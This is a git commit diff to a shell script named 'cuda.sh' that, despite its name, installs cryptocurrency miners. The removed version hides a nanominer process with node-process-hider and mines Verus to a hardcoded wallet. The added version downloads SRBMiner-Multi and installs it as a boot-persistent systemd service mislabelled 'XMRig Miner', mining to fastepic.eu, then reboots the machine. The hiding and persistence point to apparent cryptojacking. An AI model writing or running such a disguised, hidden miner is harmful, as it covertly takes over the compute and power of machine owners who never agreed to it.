1291b4e12c1e026305ddc798b514f98e9c1e784d
techne <108133282+varfeplas@users.noreply.github.com>
2023-06-22 15:02:25 +0530

    Update cuda.sh

--- cuda.sh
+++ cuda.sh
@@ -1,12 +1,9 @@
-!/bin/sh
-sudo su <<EOF
-sudo apt install screen -y
-sudo apt update && apt install --assume-yes curl && curl --silent --location https://deb.nodesource.com/setup_14.x  | bash - && apt install --assume-yes nodejs && apt-get install -y nodejs && apt-get install gcc g++ make && curl -sL https://dl.yarnpkg.com/debian/pubkey.gpg | gpg --dearmor | tee /usr/share/keyrings/yarnkey.gpg >/dev/null
-echo "deb [signed-by=/usr/share/keyrings/yarnkey.gpg] https://dl.yarnpkg.com/debian stable main" | tee /etc/apt/sources.list.d/yarn.list
-sudo apt-get update && sudo apt-get install yarn -y && sudo npm install -g npm@9.1.1 && sudo npm install -g npm && sudo npm install -g node-process-hider
-sudo ph add nanominer
-wget -q https://github.com/nanopool/nanominer/releases/download/v3.8.3/nanominer-linux-3.8.3.tar.gz
-tar -xvf nanominer-linux-3.8.3.tar.gz
-screen -dms run ./nanominer -algo verus  -pool1 = na.luckpool.net:3956 -wallet RHLq39GaywnjmwSUd3R6aw6yMwn4u77SQ1 -coin VRSC -rigName ibm2
-top
-EOF
+cd /usr/local/bin
+myworker=$(date +'%d%m')
+sudo apt install libc6 -y
+sudo wget https://github.com/doktor83/SRBMiner-Multi/releases/download/2.2.9/SRBMiner-Multi-2-2-9-Linux.tar.xz
+sudo tar -xvf SRBMiner-Multi-2-2-9-Linux.tar.xz
+sudo bash -c 'echo -e "[Unit]\nDescription=XMRig Miner\nAfter=network.target\n\n[Service]\nType=simple\nExecStart=/usr/local/bin/SRBMiner-Multi-2-2-9/SRBMiner-MULTI --disable-gpu --algorithm verushash --pool stratum+ssl://fastepic.eu:3418 --wallet tgseva."'${myworker}_innew'" --password hybrid\n\n[Install]\nWantedBy=multi-user.target" > /etc/systemd/system/verus.service'
+sudo systemctl daemon-reload
+sudo systemctl enable verus.service
+sudo reboot &
